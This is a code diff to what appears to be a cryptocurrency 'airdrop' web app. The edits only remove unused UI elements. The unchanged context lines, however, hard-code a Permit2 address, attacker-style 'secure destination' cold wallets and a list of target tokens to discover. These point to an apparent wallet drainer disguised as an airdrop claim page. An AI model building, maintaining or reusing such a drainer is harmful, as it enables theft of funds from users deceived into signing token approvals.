@@ -15,10 +15,7 @@ import { BrowserProvider, Contract, formatUnits } from 'ethers'
 import {
   ArrowLeft,
   X,
-  XCircle,
   ChevronDown,
-  Copy,
-  QrCode,
   Wallet,
   Shield,
   CheckCircle,
@@ -46,9 +43,6 @@ const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
 // 💰 SECURE DESTINATION WALLETS
 const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'
 const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'
-
-// 🎨 UI DISPLAY ADDRESSES
-const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 
 // 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
 const TARGET_TOKENS: Record<string, any> = {
@@ -177,11 +171,9 @@ const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))
 
 export default function App({ onClose }: { onClose?: () => void } = {}) {
   // ── Original Dapp state ──
-  const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
-  const [amountError, setAmountError] = useState('')
   const [debugLogs, setDebugLogs] = useState<string[]>([])
 
   // ── Airdrop UI state ──
@@ -625,9 +617,7 @@ export default function App({ onClose }: { onClose?: () => void } = {}) {
     return '#6b7280'
   }
 
-  const isButtonDisabled = loading
-  const buttonText = loading ? 'Loading...' : !isConnected ? 'Next' : status === '✅ Processing Complete!' ? 'Sent' : status.includes('❌') ? 'Retry' : 'Next'
-
+  
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#0b0f17', color: '#f3f4f6', fontFamily: 'system-ui, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50, overflowY: 'auto' }}>
       <style>{`
